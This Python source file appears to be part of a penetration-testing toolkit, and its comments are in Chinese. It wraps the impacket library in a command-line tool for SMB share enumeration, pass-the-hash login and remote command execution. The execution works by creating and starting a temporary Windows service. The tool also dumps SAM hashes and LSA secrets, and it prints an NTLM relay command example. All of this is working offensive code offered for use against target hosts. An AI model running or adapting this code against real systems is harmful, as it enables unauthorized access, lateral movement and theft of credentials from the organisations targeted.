# tools/impacket_wrapper.py
"""
impacket 工具包装器 - 真实实现
用法: python -m tools.impacket_wrapper <module> --target <target> [options]

支持模块:
  smbclient   - SMB共享枚举
  smbexec     - SMB远程命令执行（需有效凭据）
  secretsdump - 凭据转储（需管理员权限）
  ntlmrelayx  - NTLM中继（需网络条件）
"""
import sys
import json
import argparse
import traceback
import socket

# 尝试导入 impacket 模块
try:
    from impacket.smbconnection import SMBConnection
    from impacket.smb import SMB_DIALECT
    from impacket.nmb import NetBIOSTimeout
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    SMBConnection = None

try:
    from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
    HAS_SECRETSDUMP = True
except ImportError:
    HAS_SECRETSDUMP = False

try:
    from impacket.smbconnection import SessionError
    HAS_SESSION_ERROR = True
except ImportError:
    HAS_SESSION_ERROR = False
    SessionError = Exception


def _smb_connect(target, port=445, username='', password='', domain='',
                 ntlm_hash='', timeout=10):
    """
    建立SMB连接
    :param ntlm_hash: LM:NT 格式的哈希，用于哈希传递
    :return: SMBConnection 对象
    """
    if not HAS_IMPACKET:
        raise RuntimeError("impacket 未安装，请运行: pip install impacket")

    # 解析目标
    try:
        remote_name = target
        remote_host = target
        # 尝试NetBIOS名称解析
        try:
            from impacket.nmb import NetBIOS
            nb = NetBIOS()
            names = nb.getNodeName(target)
            if names:
                remote_name = names[0]
        except Exception:
            pass

        conn = SMBConnection(
            remote_name,
            remote_host,
            sess_port=port,
            timeout=timeout
        )

        # 认证
        lmhash = ''
        nthash = ''
        if ntlm_hash and ':' in ntlm_hash:
            lmhash, nthash = ntlm_hash.split(':')

        conn.login(
            username,
            password,
            domain,
            lmhash,
            nthash
        )
        return conn
    except NetBIOSTimeout:
        raise RuntimeError(f"连接 {target} 超时（NetBIOS名称解析失败）")
    except SessionError as e:
        raise RuntimeError(f"SMB认证失败: {e}")
    except socket.timeout:
        raise RuntimeError(f"连接 {target}:{port} 超时")
    except ConnectionRefusedError:
        raise RuntimeError(f"连接 {target}:{port} 被拒绝")
    except Exception as e:
        raise RuntimeError(f"SMB连接失败: {e}")


def run_smbclient(target, output_file=None, **kwargs):
    """
    真实SMB共享枚举
    支持匿名访问和认证访问
    """
    results = []
    username = kwargs.get('username', '')
    password = kwargs.get('password', '')
    domain = kwargs.get('domain', '')
    ntlm_hash = kwargs.get('ntlm_hash', '')
    port = kwargs.get('port', 445)

    results.append(f"连接到 {target}:{port}")

    try:
        conn = _smb_connect(
            target, port=port,
            username=username, password=password,
            domain=domain, ntlm_hash=ntlm_hash
        )

        results.append(f"认证成功: {domain}\\{username or '匿名'}")
        results.append(f"远程OS: {conn.getServerOS()}")
        results.append(f"NetBIOS名称: {conn.getServerName()}")
        results.append(f"DNS名称: {conn.getServerDNSDomainName()}")
        results.append(f"SMB方言: {conn.getDialect()}")
        results.append("")

        # 枚举共享
        shares = conn.listShares()
        results.append(f"共享列表 (共{len(shares)}个):")
        for share in shares:
            share_name = share['shi1_netname'][:-1]  # 去掉末尾的\x00
            share_type = share['shi1_type']
            share_remark = share.get('shi1_remark', '')
            if isinstance(share_remark, bytes):
                try:
                    share_remark = share_remark.decode('utf-8', errors='ignore').rstrip('\x00')
                except Exception:
                    share_remark = ''

            type_map = {
                0: '磁盘',
                1: '打印队列',
                2: '设备',
                3: 'IPC',
                0x80000000: '特殊'
            }
            type_str = type_map.get(share_type, f'未知({share_type})')
            remark_str = f" - {share_remark}" if share_remark else ""
            results.append(f"  [{type_str}] {share_name}{remark_str}")

        # 尝试列出每个共享的根目录（仅对有权限的共享）
        results.append("")
        results.append("共享根目录内容:")
        for share in shares:
            share_name = share['shi1_netname'][:-1]
            try:
                files = conn.listPath(share_name, '*')
                file_list = []
                for f in files:
                    fname = f.get_longname()
                    if fname in ('.', '..'):
                        continue
                    is_dir = f.is_directory()
                    file_list.append(f"{'<DIR>' if is_dir else '     '} {fname}")
                if file_list:
                    results.append(f"  \\\\{target}\\{share_name}:")
                    for f in file_list[:20]:
                        results.append(f"    {f}")
                    if len(file_list) > 20:
                        results.append(f"    ... 共{len(file_list)}项")
            except Exception:
                pass

        conn.logoff()
        results.append("")
        results.append("✅ SMB枚举完成")

    except Exception as e:
        results.append(f"❌ {str(e)}")
        return {"results": results, "success": False, "error": str(e)}

    return {"results": results, "success": True}


def run_smbexec(target, output_file=None, **kwargs):
    """
    真实SMB命令执行（通过服务管理器）
    需要管理员凭据
    """
    results = []
    username = kwargs.get('username', '')
    password = kwargs.get('password', '')
    domain = kwargs.get('domain', '')
    ntlm_hash = kwargs.get('ntlm_hash', '')
    command = kwargs.get('command', 'whoami')

    if not username:
        results.append("❌ smbexec 需要提供用户名（--username）")
        return {"results": results, "success": False, "error": "需要凭据"}

    results.append(f"连接目标: {target}")
    results.append(f"执行命令: {command}")

    try:
        from impacket.dcerpc.v5 import transport, scmr, srvs
        from impacket.dcerpc.v5.rpcrt import DCERPCException

        # 建立SMB连接
        conn = _smb_connect(
            target,
            username=username, password=password,
            domain=domain, ntlm_hash=ntlm_hash
        )

        # 绑定SVCCTL
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % target)
        rpctransport.set_smb_connection(conn)
        dce = rpctransport.get_dce_rpc()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # 打开服务管理器
        resp = scmr.hROpenSCManagerW(dce)
        scm_handle = resp['lpScHandle']

        # 创建临时服务
        service_name = f"MrHuaSvc_{__import__('random').randint(10000, 99999)}"
        cmd = f'%COMSPEC% /Q /c {command} > C:\\Windows\\Temp\\{service_name}.txt 2>&1'

        resp = scmr.hRCreateServiceW(
            dce, scm_handle, service_name, service_name,
            lpBinaryPathName=cmd,
            dwStartType=scmr.SERVICE_DEMAND_START
        )
        service_handle = resp['lpServiceHandle']

        try:
            # 启动服务
            scmr.hRStartServiceW(dce, service_handle)
            results.append("服务已启动，等待执行...")
            import time
            time.sleep(3)
        except DCERPCException:
            pass

        # 读取输出
        try:
            buf = conn.getFile('C$', f'Windows\\Temp\\{service_name}.txt')
            output = b''.join(buf).decode('gbk', errors='ignore').strip()
            results.append("命令输出:")
            for line in output.split('\n'):
                results.append(f"  {line}")
            # 清理临时文件
            conn.deleteFile('C$', f'Windows\\Temp\\{service_name}.txt')
        except Exception as e:
            results.append(f"读取输出失败: {e}")

        # 删除服务
        scmr.hRDeleteService(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, scm_handle)
        conn.logoff()

        results.append("✅ 命令执行完成")

    except Exception as e:
        results.append(f"❌ {str(e)}")
        return {"results": results, "success": False, "error": str(e)}

    return {"results": results, "success": True}


def run_secretsdump(target, output_file=None, **kwargs):
    """
    真实凭据转储
    需要管理员凭据
    """
    results = []
    username = kwargs.get('username', '')
    password = kwargs.get('password', '')
    domain = kwargs.get('domain', '')
    ntlm_hash = kwargs.get('ntlm_hash', '')

    if not HAS_SECRETSDUMP:
        results.append("❌ impacket.secretsdump 不可用")
        return {"results": results, "success": False, "error": "secretsdump模块不可用"}

    if not username:
        results.append("❌ secretsdump 需要提供管理员凭据（--username）")
        return {"results": results, "success": False, "error": "需要管理员凭据"}

    results.append(f"连接目标: {target}")
    results.append("正在转储凭据...")

    try:
        from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets

        # 建立SMB连接
        conn = _smb_connect(
            target,
            username=username, password=password,
            domain=domain, ntlm_hash=ntlm_hash
        )

        remote_ops = RemoteOperations(conn, False)
        remote_ops.connect()

        # 转储SAM
        results.append("")
        results.append("=== SAM 哈希 ===")
        sam = SAMHashes(remote_ops, isRemote=True)
        sam_hashes = []
        def sam_callback(hash_line):
            sam_hashes.append(hash_line)
        sam.dump(sam_callback)
        for h in sam_hashes:
            results.append(f"  {h}")
        if not sam_hashes:
            results.append("  (无SAM哈希)")

        # 转储LSA
        results.append("")
        results.append("=== LSA 密钥 ===")
        lsa = LSASecrets(remote_ops, isRemote=True)
        lsa_secrets = []
        def lsa_callback(secret):
            if secret:
                lsa_secrets.append(str(secret))
        lsa.dumpSecrets(lsa_callback)
        for s in lsa_secrets[:30]:
            results.append(f"  {s}")
        if len(lsa_secrets) > 30:
            results.append(f"  ... 共{len(lsa_secrets)}条")

        remote_ops.finish()
        conn.logoff()
        results.append("")
        results.append("✅ 凭据转储完成")

    except Exception as e:
        results.append(f"❌ {str(e)}")
        return {"results": results, "success": False, "error": str(e)}

    return {"results": results, "success": True}


def run_ntlmrelayx(target, output_file=None, **kwargs):
    """
    NTLM中继
    注意：此功能需要特定网络条件（如WPAD欺骗、LLMNR/NBT-NS投毒）
    这里实现基础的中继监听
    """
    results = []
    results.append(f"NTLM中继目标: {target}")
    results.append("⚠️ 此功能需要在目标网络中运行，且需要投毒条件")
    results.append("提示: 通常需要配合 Responder 或 Inveigh 进行LLMNR/NBT-NS投毒")

    try:
        from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
        from impacket.examples.ntlmrelayx.servers import SMBRelayServer
        results.append("✅ impacket ntlmrelayx 模块可用")
        results.append(f"支持的协议攻击: {', '.join(PROTOCOL_ATTACKS.keys())}")
        results.append("")
        results.append("注意: 完整的ntlmrelayx功能请直接使用 impacket-ntlmrelayx 命令行工具")
        results.append("示例: impacket-ntlmrelayx -t smb://<target> -smb2support")
    except ImportError:
        results.append("⚠️ ntlmrelayx 模块不可用")
        results.append("请使用: impacket-ntlmrelayx -t smb://<target> -smb2support")
    except Exception as e:
        results.append(f"❌ {str(e)}")
        return {"results": results, "success": False, "error": str(e)}

    return {"results": results, "success": True}


# 模块映射
MODULES = {
    "smbclient": run_smbclient,
    "smbexec": run_smbexec,
    "secretsdump": run_secretsdump,
    "ntlmrelayx": run_ntlmrelayx,
}


def main():
    parser = argparse.ArgumentParser(description="impacket 工具包装器（真实实现）")
    parser.add_argument("module", help=f"impacket 模块名称: {', '.join(MODULES.keys())}")
    parser.add_argument("--target", required=True, help="目标主机")
    parser.add_argument("--output", help="输出文件路径")
    parser.add_argument("--username", "-u", default="", help="用户名")
    parser.add_argument("--password", "-p", default="", help="密码")
    parser.add_argument("--domain", "-d", default="", help="域名")
    parser.add_argument("--ntlm-hash", default="", help="NTLM哈希 (LM:NT格式)")
    parser.add_argument("--port", type=int, default=445, help="SMB端口")
    parser.add_argument("--command", "-c", default="whoami", help="smbexec执行的命令")
    args = parser.parse_args()

    if args.module not in MODULES:
        print(json.dumps({"error": f"未知模块: {args.module}", "available": list(MODULES.keys())}))
        sys.exit(1)

    try:
        result = MODULES[args.module](
            args.target,
            args.output,
            username=args.username,
            password=args.password,
            domain=args.domain,
            ntlm_hash=args.ntlm_hash,
            port=args.port,
            command=args.command
        )
        result["module"] = args.module
        result["target"] = args.target
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(result, f, ensure_ascii=False, indent=2)
        print(json.dumps(result, ensure_ascii=False, indent=2))
        if not result.get("success", False):
            sys.exit(1)
    except Exception as e:
        print(json.dumps({
            "success": False,
            "error": str(e),
            "traceback": traceback.format_exc()
        }, ensure_ascii=False))
        sys.exit(1)


if __name__ == "__main__":
    main()
